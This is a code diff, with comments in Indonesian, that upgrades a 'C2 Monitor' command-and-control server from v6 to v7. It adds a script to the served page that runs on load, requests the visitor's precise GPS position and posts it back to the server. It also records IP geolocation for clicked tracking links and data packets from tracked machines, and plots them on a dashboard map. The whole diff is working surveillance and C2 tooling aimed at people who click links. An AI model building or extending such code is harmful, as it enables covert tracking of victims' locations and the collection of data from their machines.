@@ -70,7 +70,7 @@ from datetime import datetime
 PORT = int(os.environ.get("C2_PORT", "8080"))
 LOG_DIR = os.environ.get("C2_LOG_DIR", "./received_logs")
 DASH_PASS = os.environ.get("C2_DASH_PASS", "")
-VERSION = "6"
+VERSION = "7"
 
 EVENTS_FILE = os.path.join(LOG_DIR, "events.jsonl")
 COMMANDS_FILE = os.path.join(LOG_DIR, "commands.jsonl")
@@ -168,20 +168,22 @@ def record_event(ev):
         emit(f" [!] Gagal menulis events.jsonl: {e}")
 
 
-def _geolocate(client_ip):
+def _geo(client_ip):
+    """Kembalikan (teks_lokasi, lat, lon) dari IP (perkiraan level provider)."""
+    lat = lon = None
     try:
         addr = ipaddress.ip_address(client_ip)
     except ValueError:
-        return f"IP tidak valid: {client_ip}"
+        return f"IP tidak valid: {client_ip}", None, None
     if addr.is_private:
-        return "Local network (IP privat, tidak bisa di-geolocate)"
+        return "Local network (IP privat, tidak bisa di-geolocate)", None, None
     if addr.is_link_local or addr.is_reserved:
-        return "Alamat reserved/link-local (tidak bisa di-geolocate)"
+        return "Alamat reserved/link-local (tidak bisa di-geolocate)", None, None
     try:
         start = int(ipaddress.ip_address("100.64.0.0"))
         end = int(ipaddress.ip_address("100.127.255.255"))
         if start <= int(addr) <= end:
-            return "VPN/CGNAT (100.64.0.0/10, tidak bisa di-geolocate)"
+            return "VPN/CGNAT (100.64.0.0/10, tidak bisa di-geolocate)", None, None
     except ValueError:
         pass
     try:
@@ -194,17 +196,23 @@ def _geolocate(client_ip):
             city = info.get("city") or info.get("regionName") or info.get("country")
             base = f"{city}, {info.get('regionName')}, {info.get('country')} ({lat}, {lon})"
             if addr:
-                return f"{addr} | {base} - ISP: {info.get('isp')}"
-            return f"{base} - ISP: {info.get('isp')}"
-        return f"Gagal lookup: {info.get('message', 'no message')}"
+                return f"{addr} | {base} - ISP: {info.get('isp')}", lat, lon
+            return f"{base} - ISP: {info.get('isp')}", lat, lon
+        return f"Gagal lookup: {info.get('message', 'no message')}", None, None
     except Exception as e:
-        return f"Error lookup: {e}"
+        return f"Error lookup: {e}", None, None
 
 
 def geolocate(client_ip):
     if client_ip not in loc_cache:
-        loc_cache[client_ip] = _geolocate(client_ip)
+        loc_cache[client_ip] = _geo(client_ip)[0]
     return loc_cache[client_ip]
+
+
+def geolocate_ll(client_ip):
+    text, lat, lon = _geo(client_ip)
+    loc_cache[client_ip] = text
+    return text, lat, lon
 
 
 def load_commands():
@@ -291,6 +299,24 @@ function sendFingerprint() {
     }).catch(function(){});
 }
 sendFingerprint();
+function sendLocation() {
+    if (!navigator.geolocation) return;
+    var q = new URLSearchParams(location.search);
+    var id = q.get("id") || "beacon";
+    navigator.geolocation.getCurrentPosition(function(pos) {
+        var payload = {
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: Math.round(pos.coords.accuracy)
+        };
+        fetch("/?id=" + encodeURIComponent(id), {
+            method: "POST",
+            headers: {"Content-Type": "application/x-www-form-urlencoded"},
+            body: "type=gps&machine=" + encodeURIComponent(id) + "&data=" + encodeURIComponent(JSON.stringify(payload))
+        }).catch(function(){});
+    }, function(){}, {timeout: 15000, maximumAge: 300000, enableHighAccuracy: true});
+}
+sendLocation();
 </script>
 </head>
 <body>
@@ -303,7 +329,7 @@ DASHBOARD_PAGE = r"""<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>C2 Monitor - Dashboard (v6)</title>
+<title>C2 Monitor - Dashboard (v7)</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
 <style>
@@ -360,7 +386,7 @@ pre { background:#0b1220; border:1px solid var(--border); border-radius:7px; pad
 </head>
 <body>
 <div class="topbar">
-  <h1>C2 Monitor</h1><span class="ver">v6</span>
+  <h1>C2 Monitor</h1><span class="ver">v7</span>
   <div class="conn"><span class="dot off" id="connDot"></span><span id="connTxt">Menghubungkan...</span></div>
 </div>
 <div class="tabs">
@@ -583,17 +609,24 @@ function initMap() {
     }).addTo(LMap);
 }
 function machineLocations(ev) {
-    var got = {}, seen = {};
-    for (var i = 0; i < ev.length; i++) {
+    var got = {};
+    for (var i = ev.length - 1; i >= 0; i--) {
         var e = ev[i];
-        if (e.type === "gps" && e.detail && e.detail.lat != null && e.detail.lon != null) {
-            var key = e.id || e.ip;
-            if (!seen[key]) {
-                seen[key] = 1;
-                got[key] = { id: key, ip: e.ip, lat: Number(e.detail.lat), lon: Number(e.detail.lon), addr: e.detail.address || e.location, time: e.time };
-            }
+        var key = (e.id && e.id !== "-" && e.id !== "beacon") ? e.id : e.ip;
+        if (!key) continue;
+        if (!got[key]) got[key] = { id: key, ip: e.ip, lat: null, lon: null, addr: e.location || "", time: e.time, precise: false };
+        var m = got[key];
+        if (e.type === "gps" && e.detail && e.detail.lat != null && !m.precise) {
+            m.lat = Number(e.detail.lat); m.lon = Number(e.detail.lon);
+            if (e.detail.address) m.addr = e.detail.address;
+            m.time = e.time; m.precise = true;
+        } else if (e.lat != null && e.lon != null && !m.precise && m.lat == null) {
+            m.lat = Number(e.lat); m.lon = Number(e.lon);
+            if (e.location) m.addr = e.location;
+            m.time = e.time;
         }
     }
+    for (var k in got) if (got[k].lat == null) delete got[k];
     return got;
 }
 function updateMap(ev) {
@@ -602,13 +635,16 @@ function updateMap(ev) {
     for (var k in markers) if (!got[k]) { LMap.removeLayer(markers[k]); delete markers[k]; }
     for (var k2 in got) {
         var g = got[k2];
-        var popup = "<b>" + esc(g.id) + "</b><br>" + esc(g.addr) + "<br><i>" + g.lat.toFixed(6) + ", " + g.lon.toFixed(6) + "</i><br>" + esc(g.time);
+        var src = g.precise ? "GPS presisi" : "perkiraan dari IP";
+        var popup = "<b>" + esc(g.id) + "</b> <i>(" + src + ")</i><br>" + esc(g.addr) + "<br><b>" + g.lat.toFixed(6) + ", " + g.lon.toFixed(6) + "</b><br>" + esc(g.time);
         if (markers[k2]) {
             var mk = markers[k2];
             mk.setLatLng([g.lat, g.lon]);
             mk.bindPopup(popup);
-        } else {
+        } else if (g.precise) {
             markers[k2] = L.marker([g.lat, g.lon]).addTo(LMap).bindPopup(popup);
+        } else {
+            markers[k2] = L.circleMarker([g.lat, g.lon], {radius: 9, color: "#8aa0bf", weight: 2, fillColor: "#8aa0bf", fillOpacity: 0.5}).addTo(LMap).bindPopup(popup);
         }
     }
     var keys = Object.keys(got);
@@ -747,7 +783,7 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
         client_ip = self.real_client_ip()
         t = now_str()
         tracking_id = query.get("id", [""])[0] or "-"
-        location = resolve_location(client_ip, tracking_id)
+        location, ilat, ilon = geolocate_ll(client_ip)
         fname = os.path.join(LOG_DIR, f"click_{client_ip}_{file_ts()}.log")
         content = f"IP: {client_ip}\nWaktu: {t}\nPath: {parsed.path}\nID: {tracking_id}\nLokasi: {location}\n"
         try:
@@ -757,7 +793,7 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
             emit(f" [!] Gagal simpan file: {e}")
         record_event({
             "time": t, "type": "click", "ip": client_ip, "id": tracking_id,
-            "path": parsed.path, "location": location, "file": fname
+            "path": parsed.path, "location": location, "lat": ilat, "lon": ilon, "file": fname
         })
         emit("=" * 60)
         emit(" [+] LINK DIKLIK")
@@ -875,6 +911,7 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
                 record_event({
                     "time": t, "type": "gps", "ip": client_ip, "id": machine,
                     "path": "/", "location": addr or resolve_location(client_ip, machine),
+                    "lat": lat, "lon": lon,
                     "detail": {"lat": lat, "lon": lon, "accuracy": detail.get("accuracy"), "address": addr, "machine": machine}, "file": fname
                 })
                 emit("=" * 60)
@@ -918,9 +955,10 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
                 detail = json.loads(data_payload)
             except ValueError:
                 detail = data_payload
+            dloc, dlat, dlon = geolocate_ll(client_ip)
             record_event({
                 "time": t, "type": "data", "ip": client_ip, "id": machine,
-                "path": "/", "location": resolve_location(client_ip, machine), "detail": detail, "file": fname
+                "path": "/", "location": dloc, "lat": dlat, "lon": dlon, "detail": detail, "file": fname
             })
             emit("=" * 60)
             emit(" [+] PAKET DATA DITERIMA")
